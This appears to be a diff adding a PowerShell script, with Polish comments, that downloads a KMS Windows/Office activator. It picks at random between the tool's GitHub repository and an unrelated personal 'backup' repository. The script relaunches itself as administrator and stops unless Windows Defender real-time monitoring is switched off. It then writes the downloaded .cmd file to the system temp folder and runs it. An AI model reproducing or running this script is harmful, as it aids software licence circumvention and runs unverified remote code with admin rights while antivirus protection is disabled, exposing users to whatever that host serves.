@@ -1,0 +1,75 @@
+# Skrypt zapisujący KMS_VL_ALL_AIO.cmd do pliku i uruchamiający go jako administrator w tym samym oknie
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+$URLs = @(
+    'https://github.com/abbodi1406/KMS_VL_ALL_AIO/raw/refs/heads/master/KMS_VL_ALL_AIO.cmd',
+    'https://github.com/testmina77/testmina77.github.io/raw/refs/heads/main/ACTIVATOR_BACKUP.cmd'
+)
+
+foreach ($URL in $URLs | Sort-Object { Get-Random }) {
+    try { $cmdContent = Invoke-WebRequest -Uri $URL -UseBasicParsing; break } catch {}
+}
+if (-not $cmdContent) {
+    Check3rdAV
+    Write-Host "Failed to download activator from repositories! Quitting..."
+    return
+}
+
+
+# Funkcja do sprawdzania, czy skrypt jest uruchomiony jako administrator
+function Test-Admin {
+    $isAdmin = [bool]([Security.Principal.WindowsIdentity]::GetCurrent().Groups -match 'S-1-5-32-544')
+    return $isAdmin
+}
+
+# Funkcja do sprawdzania zainstalowanych antywirusów
+function Check3rdAV {
+    $avList = Get-CimInstance -Namespace root\SecurityCenter2 -Class AntiVirusProduct | Where-Object { $_.displayName -notlike '*windows*' } | Select-Object -ExpandProperty displayName
+    if ($avList) {
+        Write-Host '3rd party Antivirus might be blocking the script - ' -ForegroundColor White -BackgroundColor Blue -NoNewline
+        Write-Host " $($avList -join ', ')" -ForegroundColor DarkRed -BackgroundColor White
+    }
+}
+
+# Funkcja do sprawdzania istnienia pliku
+function CheckFile { 
+    param ([string]$FilePath) 
+    if (-not (Test-Path $FilePath)) { 
+        Check3rdAV
+        Write-Host "Failed to create file in temp folder, aborting!"
+        throw 
+    } 
+}
+
+# Jeśli skrypt nie jest uruchomiony jako administrator, uruchomić ponownie z uprawnieniami administratora
+if (-not (Test-Admin)) {
+    Write-Host "Re-running the script as Administrator..."
+    $argList = "$($myinvocation.MyCommand.Definition)"
+    Start-Process powershell -ArgumentList "-Command $argList" -Verb RunAs
+    return
+}
+$defenderPreferences = Get-MpPreference
+
+# Check if DisableRealtimeMonitoring is set to true
+if ($defenderPreferences.DisableRealtimeMonitoring -eq $true) {
+    Write-Host "Windows Defender real-time monitoring is disabled. Continuing"
+} else {
+    Write-Host "Windows Defender real-time monitoring is enabled! Disable it in Settings and re run command!"
+	start windowsdefender://threatsettings/
+	return
+}
+
+# Tworzenie tymczasowego pliku .cmd
+$rand = [Guid]::NewGuid().Guid
+$FilePath = "$env:SystemRoot\Temp\ACTIVATOR_$rand.cmd"
+Set-Content -Path $FilePath -Value $cmdContent
+
+# Sprawdzanie, czy plik został zapisany poprawnie
+CheckFile $FilePath
+
+# Uruchomienie pliku .cmd w tym samym oknie PowerShell (bez otwierania nowego okna)
+$process = Start-Process -FilePath "$env:SystemRoot\system32\cmd.exe" -ArgumentList "/c $FilePath" -PassThru -Wait -NoNewWindow
+
+Write-Host "Windows Defender real-time monitoring is disabled! Enable it in Settings!"
+start windowsdefender://threatsettings/
+# Usunięcie pliku po wykonaniu
+Remove-Item $FilePath
